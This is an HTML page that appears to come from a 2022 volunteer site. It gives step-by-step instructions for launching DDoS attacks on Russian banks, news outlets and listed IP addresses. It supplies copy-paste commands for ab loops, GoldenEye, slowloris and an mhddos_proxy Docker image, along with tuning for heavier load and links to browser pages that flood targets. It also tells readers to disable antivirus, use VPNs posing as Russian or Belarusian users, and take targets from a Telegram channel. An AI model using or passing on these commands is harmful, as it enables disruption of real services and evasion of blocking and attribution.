<main>
    <h2 class="title_h2">Instructions to configure DDOS attacks to enemy country</h2>

    <a href="https://ddosukraine.com.ua/vps/" data-toggle="tooltip" data-title="Don't rape your PC, spend some time and configure real server!" class="btn btn-sm btn-danger  mt-3"><i class="fas fa-server"></i> VPS configuration instructions (UA)</a>

    <ul class="nav nav-tabs mt-5" id="myTab" role="tablist">
        <li class="nav-item" role="presentation">
            <a class="nav-link active" id="ubuntu-tab" data-toggle="tab" href="#ubuntu" role="tab" aria-controls="ubuntu" aria-selected="true">Instructions for Ubuntu</a>
        </li>
        <li class="nav-item" role="presentation">
            <a class="nav-link" id="windows-tab" data-toggle="tab" href="#windows" role="tab" aria-controls="windows" aria-selected="false">Instructions for Windows</a>
        </li>
        <li class="nav-item" role="presentation">
            <a class="nav-link" id="site-tab" data-toggle="tab" href="#site" role="tab" aria-controls="site" aria-selected="false">Via your browser</a>
        </li>
    </ul>

    <div class="tab-content" id="myTabContent">

        <!-- Ubuntu Tab -->

        <div class="tab-pane fade show active" id="ubuntu" role="tabpanel" aria-labelledby="ubuntu-tab">

            <h4>If you have Apache webserver</h4>
            You can use ab package (included to apache for performance testing)
            Run it like
            <pre>
        <code class="copy">ab -c 50 -n 30000 "https://sberbank.ru/"</code>
    </pre>
            -с 50 - 50 concurent requests,
            but yout IP address can be blocked by target, change it if you can.

            Loop it
            ab.sh contents
            <pre>
        <code>#!/bin/bash
      while true
      do
      ./abrun.sh
      done
      </code>
    </pre>

            abrun.sh contents
            <pre>
      <code>
      #!/bin/bash
      ab -c 50 -n 30000 https://sberbank.ru/
      </code>
    </pre>

            use target domain<br>
            make ab.sh, abrun.sh files executable <br>
            chmod +x ab.sh<br>
            chmod +x abrun.sh<br>
            You should have both files in the same folder
            ./ab.sh

            <br><br>

            <h4>GoldenEye</h4>
            <a target="_blank" href="https://github.com/jseidl/GoldenEye">Link to the repo</a>
            Clone GoldenEye repo from GitHub.
            <pre>
      <code>git clone https://github.com/jseidl/GoldenEye.git</code>
      </pre>
            You will have new folder, open it.
            </br>
            <code>cd GoldenEye/</code><br>
            It's time to start DDOS-attach
            Run following command to start attack with default settings
            <pre>
      <code>
      ./goldeneye.py http://victim-website.com
      </code>
    </pre>

            Check options <a target="_blank" href="https://github.com/jseidl/GoldenEye">here</a>
        <br>
            To stop the attack press CTRL+C<br>
            It use a lot of memory, watch out

            <br>
            <br>


            <h4>Instructions to Install Docker on Ubuntu</h4>

            <span>Run each line one-by-one in your terminal</span>

            <pre><code>
    sudo apt update
    sudo apt install -y docker.io
    sudo systemctl enable docker --now
    docker
    sudo usermod -aG docker $USER
</code></pre>

            One long command
            <pre><code class="copy">printf '%s\n' "deb https://download.docker.com/linux/debian bullseye stable" | sudo tee /etc/apt/sources.list.d/docker-ce.list ; curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/docker-ce-archive-keyring.gpg</code></pre>

            Let's continue. Each line - single command :
            <pre><code>
    sudo apt update
    sudo apt install -y docker-ce docker-ce-cli containerd.io
    sudo systemctl unmask docker.service
    sudo systemctl unmask docker.socket
    sudo systemctl start docker.service
    sudo chmod 666 /var/run/docker.sock
    sudo docker run hello-world
    </code></pre>

            <h5>If you see this: Hello from Docker! You have installed Docker correctly!</h5>

            <div>
                <img src="/image/docker_hello.jpg" alt="">
            </div>

            <div class="text-content">
                <p>Let's start attacks</p>
                We recomend to use scripts. Adventages:
                <ul>
                    <li>No VPN needed, it use auto downloaded proxy configs.</li>
                    <li>Multiple targets attack with auto ballance.</li>
                    <li>It uses different attack methods and changes it on fly</li>
                    <li>User friendly interface</li>
                </ul>

                <p><b>Turn off VPN</b> - proxies are used, VPN can make it slower!</p>
            </div>

            <h2>Docker commands to start attack</h2>

            <p>For the first run scripts will be downloaded and installed, then script will download proxy configs each 10 mins, you don't need to rerun it</p>

            For HTTP(s) attacks by URL

            <pre>
        <code class="copy">docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 https://ria.ru https://tass.ru</code>
      </pre>

            For HTTP attacks by IP + PORT
            <pre>
        <code class="copy">docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 5.188.56.124:80 5.188.56.124:3606</code>
    </pre>


            TCP protocol attacks

            <pre>
        <code class="copy">docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 tcp://194.54.14.131:4477 tcp://194.54.14.131:22</code>
    </pre>

            To update scripts
            <pre><code class="copy">docker pull ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest</code></pre>


            <h2 class="title_h2">Configs</h2>
            <p>All configs can be used</p>

            <p>Change loading capacity: -t XXX - number of CPU processes for each core, by default - 300, I use -t 2500, try -t 1000, and then increase it</p>

            <p>To check attack process - add flag "--debug"</p>

            <h2 class="title_h2">To send target for IT Army of Ukraine public</h2>
            <p>Link: <a href="https://t.me/itarmyofukraine2022" target="_blank">https://t.me/itarmyofukraine2022</a></p>

            To simplify your task you need to prepare it with <a href="https://ddosukraine.com.ua/" target="_blank">this service</a>
            <p>It will return all needed IP addresses for your docker command</p>
            <pre><code class="copy">docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000</code></pre>
            and add returned addresses here.</p>

        </div>

        <!-- Ubuntu tab END -->


        <!-- Windows Tab -->
        <div class="tab-pane fade show img" id="windows" role="tabpanel" aria-labelledby="windows-tab">

            <b>Check 2 configuration methods below:</b>

            <ol>
                <li>Python method is better for your PC performance</li>
                <li>Docker method</li>
            </ol>


            <div class="alert alert-warning">
                <b>Attention!</b>
                Turn off all your antiviris applications to use DDOS.
            </div>

            <ul class="nav nav-tabs mt-5 mb-3" id="myTab" role="tablist">
                <li class="nav-item" role="presentation">
                    <a class="nav-link active" id="pyton-tab1" data-toggle="tab" href="#pyton1" role="tab" aria-controls="pyton1" aria-selected="true">Instruction for Python (MHDDoS)</a>
                </li>
                <li class="nav-item" role="presentation">
                    <a class="nav-link" id="pyton-tab2" data-toggle="tab" href="#pyton2" role="tab" aria-controls="pyton2" aria-selected="false">Instruction for  Python (slowloris)</a>
                </li>
                <li class="nav-item" role="presentation">
                    <a class="nav-link" id="docker-tab" data-toggle="tab" href="#docker" role="tab" aria-controls="docker" aria-selected="false">Instruction for Docker</a>
                </li>
            </ul>

            <div class="tab-content" id="myTabContent">

                <div class="tab-pane fade show img active" id="pyton1" role="tabpanel" aria-labelledby="pyton-tab1">

                    <h3>Python configurations (MHDDoS)</h3>

                    Download and install Python and Git
                    <ul>
                        <li>
                            <a href="https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe" target="_blank">https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe</a>
                        </li>
                        <li>
                            <a href="https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe" target="_blank">https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe</a>
                        </li>
                    </ul>

                    <p>Create new folder on your desktop (example: ddos), go to it and run Git Bash</p>

                    <img src="/image/gitbash_start.jpg" alt="">

                    <p>Then run following commands line by line</p>
                    <pre><code class="copy">git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git</code></pre>

                    <pre><code class="copy">cd mhddos_proxy</code></pre>

                    <!-- <pre><code class="copy">git clone https://github.com/MHProDev/MHDDoS.git</code></pre> -->

                    <pre><code class="copy">python -m pip install -r requirements.txt</code></pre>

                    <p>Make sure you are using<b>python</b>, not python3.</p>

                    <p>If you see this error:</p>
                    <pre><code>bash: python: command not found</code></pre>
                    <p>Or like that:</p>
                    <pre><code>bash: permission denied</code></pre>

                    <p><a class="btn btn-primary mt-3 mb-3" data-toggle="collapse" href="#target">Here is solution</a></p>

                    <div class="collapse mb-3" id="target">
                        <div class="card card-body">
                            <p>You didn't install Python or did it incorrectly. Check point 1 from instruction or do some manual configs</p>

                            <ol>
                                <li>
                                    Go to computer preferences,
                                    <img src="/image/python/python_1.jpg" alt="">
                                </li>

                                <li>
                                    Go to additional system configs
                                    <img src="/image/python/python_2.jpg" alt="">
                                </li>
                                <li>
                                    Environment variables
                                    <img src="/image/python/python_3.jpg" alt="">
                                </li>
                                <li>
                                    Find variable "Path" and change it
                                    <img src="/image/python/python_4.jpg" alt="">
                                </li>
                                <li>
                                    You should insert path to Python (By default: C:\Users\{Назва Вашого Користувача}\AppData\local\Programs\Python\Python310-2\)
                                    <p>Folder AppData is hidden, turn on displaying hidden files</p>
                                    <p>Or reinstall Python (Modify) and check the path in your system</p>
                                    <p>Open it</p>
                                    <img src="/image/python/python_5.jpg" alt="">
                                </li>

                                <li>
                                    Go back to environment variables, click "Create" and paste path.
                                    <img src="/image/python/python_6.jpg" alt="">
                                </li>

                                <li>
                                    Than click "Create" again and paste same path + "\Scripts" to have 2 additional variables
                                    <img src="/image/python/python_7.jpg" alt="">
                                </li>
                                <li>
                                    Done, Reopen GitBash and run installation command again:
                                    <pre><code class="copy">python -m pip install -r MHDDoS/requirements.txt</code></pre>
                                </li>
                            </ol>
                        </div>
                    </div>



                    For HTTP(s) attack by URL
                    <pre><code class="copy">python runner.py -t 1000 https://ria.ru https://tass.ru</code></pre>

                    For HTTP attack by IP + PORT
                    <pre><code class="copy">python runner.py -t 1000 5.188.56.124:80 5.188.56.124:3606</code></pre>

                    TCP protocol attack
                    <pre><code class="copy">python runner.py tcp://194.54.14.131:4477 tcp://194.54.14.131:22</code></pre>


                    <h2 class="title_h2">Configs</h2>
                    <p>All configs can be used</p>

                    <p>Change loading capacity: -t XXX - number of CPU processes for each core, by default - 300, I use -t 2500, try -t 1000, and then increase it</p>

                    <p>To check attack process - add flag "--debug"</p>

                    <h2 class="title_h2">To send target for IT Army of Ukraine public</h2>
                    <p>Link: <a href="https://t.me/itarmyofukraine2022" target="_blank">https://t.me/itarmyofukraine2022</a></p>

                    To simplify your task you need to prepare it with <a href="https://ddosukraine.com.ua/" target="_blank">this service</a>
                    <p>It will return all needed IP addresses for your docker command</p>
                    <pre><code class="copy">docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000</code></pre>
                    and add returned addresses here.</p>

                    <li>
                        Here is attack screenshot:
                    </li>

                    <img src="/image/docker/docker_install12.jpg" alt="">

                </div>

                <div class="tab-pane fade show img" id="pyton2" role="tabpanel" aria-labelledby="pyton-tab2">

                    <h3>Instructions for Python (slowloris)</h3>

                    Download and install Python and Git
                    <ul>
                        <li>
                            <a href="https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe" target="_blank">https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe</a>
                        </li>
                        <li>
                            <a href="https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe" target="_blank">https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe</a>
                        </li>
                    </ul>

                    <p>Create new folder on your desktop (example: ddos), go to it and run Git Bash</p>

                    <img src="/image/gitbash_start.jpg" alt="">

                    <p>Than run commands one by one</p>
                    <pre><code class="copy">git clone https://github.com/gkbrk/slowloris</code></pre>

                    <pre><code class="copy">cd slowloris</code></pre>

                    <p>Run python script</p>>

                    <pre><code class="copy">python loris.py -s240 -v URL</code></pre>

                    <p>- s = number of connections</p>
                    <p>- v = first checking, not necessary</p>
                    <p> URL - For URL please make sure to use only the domain name(i.e google.com not https or www.)</p>
                </div>

                <!-- Windows Docker Tab -->

                <div class="tab-pane fade show img" id="docker" role="tabpanel" aria-labelledby="docker-tab">
                    <ol>
                        <li>Open <a href="https://www.docker.com/products/docker-desktop" target="_blank">https://www.docker.com/products/docker-desktop</a></li>
                        <li>And click:
                            <img src="/image/docker/docker_install.jpg" alt="">
                        </li>

                        <li>Run downloaded file «Docker Desktop Installer»</li>
                        <li>In case of confirmation click «Run»
                            <br>
                            <img src="/image/docker/docker_install2.jpg" alt="">
                        </li>

                        <li>Keep all checkboxes by default and click "OK"</li>
                        <img src="/image/docker/docker_install3.jpg" alt="">

                        <li>Wait for all installations.</li>
                        <li>Click "Close and restart":</li>
                        <img src="/image/docker/docker_install4.jpg" alt="">
                        <li>After PC reboot run Docker applications</li>
                        <li>Accept terms of use</li>
                        <img src="/image/docker/docker_install5.jpg" alt="">
                        <li>Install additional packages and click restart</li>
                        <img src="/image/docker/docker_install6.jpg" alt="">
                        <li>Or by - <a href="https://docs.microsoft.com/ru-ru/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package" target="_blank">link</a>
                            And click on link to download additional packages:</li>
                        <img src="/image/docker/docker_install7.jpg" alt="">
                        <li>After download run «wsl_update_x64.msi»</li>
                        <li>Install updates (NEXT and FINISH):</li>
                        <li>RESTART</li>
                        <img src="/image/docker/docker_install8.jpg" alt="">
                        <li>Wait for Docker</li>
                        <img src="/image/docker/docker_install9.jpg" alt="">
                        <li>Skip tutorial</li>
                        <img src="/image/docker/docker_install10.jpg" alt="">
                        <li>Open command line via menu or Windows+R and type “cmd”. To run multiple targets attack you should have multiple command lines "cmd" from step 16</li>
                        <img src="/image/docker/docker_install11.jpg" alt="">

                        <h2>Docker commands to start attack</h2>

                        <p>For the first run scripts will be downloaded and installed, then script will download proxy configs each 10 mins, you don't need to rerun it</p>

                        For HTTP(s) attacks by URL
                        <pre>
            <code class="copy">docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 https://ria.ru https://tass.ru</code>
            </pre>
                        For HTTP attacks by IP + PORT

                        <pre>
            <code class="copy">docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 5.188.56.124:80 5.188.56.124:3606</code>
        </pre>


                        TCP protocol attacks

                        <pre>
            <code class="copy">docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000 tcp://194.54.14.131:4477 tcp://194.54.14.131:22</code>
        </pre>


                        <h2 class="title_h2">Configs</h2>
                        <p>All configs can be used</p>

                        <p>Change loading capacity: -t XXX - number of CPU processes for each core, by default - 300, I use -t 2500, try -t 1000, and then increase it</p>

                        <p>To check attack process - add flag "--debug"</p>

                        <h2 class="title_h2">To send target for IT Army of Ukraine public</h2>
                        <p>Link: <a href="https://t.me/itarmyofukraine2022" target="_blank">https://t.me/itarmyofukraine2022</a></p>

                        To simplify your task you need to prepare it with <a href="https://ddosukraine.com.ua/" target="_blank">this service</a>
                        <p>It will return all needed IP addresses for your docker command</p>
                        <pre><code class="copy">docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 1000</code></pre>
                        and add returned addresses here.</p>

                        <div class="alert alert-warning d-flex align-items-center mt-3" role="alert">
                            <i class="fa-solid fa-triangle-exclamation"></i><span>We recommend to run up to 15 targets</span>
                        </div>
                        <li>
                            Here is a process:
                        </li>

                        <img src="/image/docker/docker_install12.jpg" alt="">
                    </ol>
                </div>
            </div>



            <h2 class="title_h2">Glory to Ukraine!</h2>

        </div>
        <!-- Windows tab END -->


        <!-- Site Attack -->
        <div class="tab-pane fade show img" id="site" role="tabpanel" aria-labelledby="site-tab">
            If you can't use Ubuntu or Windows methods, but want to help - use any of following webservices to attack:
            <p><span class="text-danger"><b>Don't forget to use VPN!</b> </span></p>

            <div class="text-content">
                VPN list:
                <button class="btn btn-sm btn-secondary" data-toggle="modal" data-target="#vpnServicesModal"><i class="fa fa-info-circle" aria-hidden="true"></i> VPN Services</button>
            </div>

            <hr>
            <h2 class="title_h2">First web service: Attack UI</h2>
            <p>You can set configurations:</p>
            <ul>
                <li>Current targets from IT Army by default</li>
                <li>Web addresses for attack</li>
                <li>Requests limit by interval</li>
                <li>Time interval</li>
                <li>Also you can check status of each attacked site</li>
            </ul>
            <p>It's pretty simple way to help you can join!</p>
            Open service: <a class="btn btn-danger" href="https://war.apexi.tech/attack/ddos/config/?targets=https://ddosukraine.com.ua/check/targets.json" target="_blank">war.apexi.tech</a>

            <hr>

            <h2 class="title_h2">Second webservice: Ban-dera</h2>
            <p>You can't manually set targets, guys from community will do it by themself.</p>
            Service link: <a href="https://ban-dera.com" target="_blank">https://ban-dera.com</a>
            <p>Just open website in your browser and keep it. Script will work and attack</p>

            <ul>
                <b>⁉️ FAQ:</b>
                <li>Yes, you can have multiple browser tabs.</li>
                <li>You can attack with VPN or without it. But enabled VPN is better</li>
                <li>You can use Tor browser</li>
                <li>You don't need reload the page, script is automated.</li>
                <li>You can check how attack is going 😅</li>
                <li>Share it with your friends.</li>
                <li>We are updating this site, link of targets are updating.</li>
            </ul>

            <hr>

            <h2 class="title_h2">Attack to russian propoganda websites </h2>
            <p>English version  The "official" news in the Russian Federation is mostly fake and we believe it is better to shut them down and let people switch to trustful news.</p>
            <p>Please, just open this page and let it be open on your devices. It will flood the Russian propaganda websites and pose a huge load on their infrastructure.</p>
            <p>Your browser will be slow. It's ok, don't worry and keep it run.  A small contribution from each of us will save Ukraine 🙏</p>

            <ul>
                <li><a target="_blank" href="https://stop-russian-desinformation.near.page/">Link 1</a></li>
                <li><a target="_blank" href="https://2022pollquizinru.xyz/">Link 2</a></li>
                <li><a target="_blank" href="https://war.apexi.tech/attack/ddos/config/?targets=https://ddosukraine.com.ua/check/targets.json">Link 3</a></li>
                <li><a target="_blank" href="https://playforukraine.org/">Game 2048</a></li>
            </ul>

            <p>Let's go togather to the win!</p>

            <hr>

            <div class="alert alert-warning" role="alert">
                <b>Attention!</b>
                Use VPN. It's pretty simple to block access to targets from your IP address or from all ukranian IPs. Try to mask as belarussia or russia users.
            </div>

            <div class="text-content">
                VPN List:
                <button class="btn btn-sm btn-secondary" data-toggle="modal" data-target="#vpnServicesModal"><i class="fa fa-info-circle" aria-hidden="true"></i> VPN Services</button>
            </div>

            <div class="alert alert-danger" role="alert">
                <b>Warning!</b>
                Don't use targets list from untrusted resources. You can damage ukranian infrastructure. Use official information from <b>IT Army of Ukraine</b> for your attacks → <a href="https://t.me/itarmyofukraine2022" target="_blank" class="alert-link">IT Army public</a>
            </div>

        </div>

</main>



<!-- Modal VPN -->
<div data-v-534550dc="" id="vpnServicesModal" tabindex="-1" aria-labelledby="vpnServicesModalLabel" class="modal fade" aria-modal="true" role="dialog" style="display: none;">
    <div data-v-534550dc="" class="modal-dialog modal-dialog-centered modal-xl">
        <div data-v-534550dc="" class="modal-content text-start">
            <div data-v-534550dc="" class="modal-header">
                <h5 data-v-534550dc="" id="vpnServicesModalLabel" class="modal-title">VPN services</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div data-v-534550dc="" class="modal-body">
                <div data-v-534550dc="" class="row table-container">
                    <table data-v-534550dc="" class="table text-center table-hover">
                        <thead data-v-534550dc="">
                        <tr data-v-534550dc="">
                            <td data-v-534550dc="">VPN service</td>
                            <td data-v-534550dc="">Has servers in russia</td>
                            <td data-v-534550dc="">Free</td>
                            <td data-v-534550dc="">Has trial/demo</td>
                            <td data-v-534550dc="">Comments</td>
                        </tr>
                        </thead>
                        <tbody data-v-534550dc="">
                        <tr data-v-534550dc="">
                            <td data-v-534550dc=""><a data-v-534550dc="" href="https://www.hotspotshield.com/" target="_blank">Hotspot Shield</a></td>
                            <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
                            <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
                            <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
                            <td data-v-534550dc=""></td>
                        </tr>
                        <tr data-v-534550dc="">
                            <td data-v-534550dc=""><a data-v-534550dc="" href="https://clearvpn.com/" target="_blank">ClearVPN</a></td>
                            <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
                            <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
                            <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
                            <td data-v-534550dc="">Free for Ukraine</td>
                        </tr>
                        <tr data-v-534550dc="">
                            <td data-v-534550dc=""><a data-v-534550dc="" href="https://www.urban-vpn.com/" target="_blank">urbanVPN</a></td>
                            <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
                            <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
                            <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
                            <td data-v-534550dc=""></td>
                        </tr>
                        <tr data-v-534550dc="">
                            <td data-v-534550dc=""><a data-v-534550dc="" href="https://onlineshop.f-secure.com/789/purl-free-freedome-for-ukraine" target="_blank">Freedome Secure</a></td>
                            <td data-v-534550dc=""><i class="far fa-times-circle text-danger"></i></td>
                            <td data-v-534550dc=""><i class="far fa-times-circle text-danger"></i></td>
                            <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
                            <td data-v-534550dc="">6 month free for Ukraine</td>
                        </tr>
                        <tr data-v-534550dc="">
                            <td data-v-534550dc=""><a data-v-534550dc="" href="https://www.vpnunlimited.com/stop-russian-aggression" target="_blank">VPN Unlimited</a></td>
                            <td data-v-534550dc=""><i class="far fa-times-circle text-danger"></i></td>
                            <td data-v-534550dc=""><i class="far fa-times-circle text-danger"></i></td>
                            <td data-v-534550dc=""><i class="far fa-times-circle text-danger"></i></td>
                            <td data-v-534550dc="">12 month free for Ukraine</td>
                        </tr>
                        <tr data-v-534550dc="">
                            <td data-v-534550dc=""><a data-v-534550dc="" href="https://protonvpn.com/ua/" target="_blank">ProtonVPN</a></td>
                            <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
                            <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
                            <td data-v-534550dc=""><i class="fa fa-plus-circle text-success" aria-hidden="true"></i></td>
                            <td data-v-534550dc=""></td>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>